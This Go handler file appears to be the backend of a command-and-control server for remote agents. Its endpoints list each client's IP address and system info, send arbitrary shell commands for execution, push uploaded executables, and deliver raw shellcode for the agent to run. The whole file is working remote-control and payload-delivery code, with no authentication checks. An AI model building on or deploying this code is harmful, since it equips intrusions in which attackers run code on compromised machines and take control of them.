package handlers

import (
	"backend/models"
	"backend/network"
	"backend/utils"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
)

// =========================
//
//	GET /client/messages
//
// =========================
// Returns the client's metadata + last 100 messages
func getClientMessagesHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)

	// Extract client ID from query
	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Client ID required", http.StatusBadRequest)
		return
	}

	// Look up client in active connection map
	client, exists := network.GetClient(clientID)
	if !exists {
		// Still return JSON for consistent frontend handling
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Client not found",
		})
		return
	}

	// Build response containing both metadata and message history
	response := map[string]interface{}{
		"client": map[string]interface{}{
			"id":          client.ID,
			"ip_address":  client.IPAddress,
			"last_seen":   client.LastSeen,
			"system_info": client.SystemInfo, // TODO: remove?
		},
		"messages": client.Messages, // last 100 messages
	}

	json.NewEncoder(w).Encode(response)
}

// =========================
//
//	POST /command
//
// =========================
// Sends a text command to the agent (EXECUTE_COMMAND).
// The agent executes it and returns MESSAGE_COMMAND_RESULT.
// This is ONLY for shell/console commands.
func sendCommandHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)

	// Handle preflight request
	if r.Method == "OPTIONS" {
		return
	}

	// Decode JSON request body
	var cmdReq models.CommandRequest
	if err := json.NewDecoder(r.Body).Decode(&cmdReq); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Attempt to send command to active agent
	if err := network.SendCommandToClient(cmdReq.Client, cmdReq.Command); err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to send command: " + err.Error(),
		})
		return
	}

	// Success
	json.NewEncoder(w).Encode(map[string]string{
		"status": "✅ Command sent to " + cmdReq.Client,
	})
}

// =========================
//
//	POST /myCommand
//
// =========================
// TODO:
func mySendCommandHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)

	// Handle preflight request
	if r.Method == "OPTIONS" {
		return
	}

	// Decode JSON request body
	var cmdReq models.CommandRequest // TODO: change?
	if err := json.NewDecoder(r.Body).Decode(&cmdReq); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Attempt to send command to active agent
	if err := network.SendMyCommandToClient(cmdReq.Client, cmdReq.Command); err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to send command: " + err.Error(),
		})
		return
	}

	// Success
	json.NewEncoder(w).Encode(map[string]string{
		"status": "✅ Command sent to " + cmdReq.Client,
	})
}

// =========================
//
//	POST /send-binary
//
// =========================
// Uploads a binary EXE (or any file) and pushes it to the agent.
// This corresponds to your MESSAGE_UPLOAD_FILE message type.
func sendBinaryHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)

	if r.Method == "OPTIONS" {
		return
	}

	// Parse multipart form data (max 32MB)
	if err := r.ParseMultipartForm(32 << 20); err != nil {
		http.Error(w, "Failed to parse form", http.StatusBadRequest)
		return
	}

	clientAddr := r.FormValue("client")

	// Extract uploaded file
	file, _, err := r.FormFile("binaryFile")
	if err != nil {
		http.Error(w, "Failed to get file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	// Read binary contents into memory
	binaryData, err := io.ReadAll(file)
	if err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to read binary file: " + err.Error(),
		})
		return
	}

	// Send to agent
	if err := network.SendFileToClient(clientAddr, binaryData); err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to send file: " + err.Error(),
		})
		return
	}

	json.NewEncoder(w).Encode(map[string]string{
		"status": fmt.Sprintf("✅ File sent (%d bytes) to %s", len(binaryData), clientAddr),
	})
}

// =========================
//
//	POST /send-shellcode
//
// =========================
// Uploads raw shellcode (.bin or .raw) and sends it to the client.
// This triggers your MESSAGE_EXECUTE_SHELL_CODE behavior.
func sendShellcodeHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)

	if r.Method == "OPTIONS" {
		return
	}

	// Parse multipart (max 32MB)
	if err := r.ParseMultipartForm(32 << 20); err != nil {
		http.Error(w, "Failed to parse form", http.StatusBadRequest)
		return
	}

	clientAddr := r.FormValue("client")

	// Extract shellcode file
	file, _, err := r.FormFile("shellcodeFile")
	if err != nil {
		http.Error(w, "Failed to get shellcode file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	// Read entire shellcode file
	shellcodeData, err := io.ReadAll(file)
	if err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to read shellcode: " + err.Error(),
		})
		return
	}

	// Send payload to agent
	if err := network.SendShellcodeToClient(clientAddr, shellcodeData); err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to send shellcode: " + err.Error(),
		})
		return
	}

	json.NewEncoder(w).Encode(map[string]string{
		"status": fmt.Sprintf("✅ Shellcode sent (%d bytes) to %s", len(shellcodeData), clientAddr),
	})
}

// =========================
//
//	GET /client/info
//
// =========================
// Returns ONLY system info for a specific client.
func getClientInfoHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)

	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Client ID required", http.StatusBadRequest)
		return
	}

	// Look up the client
	client, exists := network.GetClient(clientID)
	if !exists {
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Client not found",
		})
		return
	}

	// Return system information directly
	json.NewEncoder(w).Encode(client.SystemInfo) // TODO: remove?
}
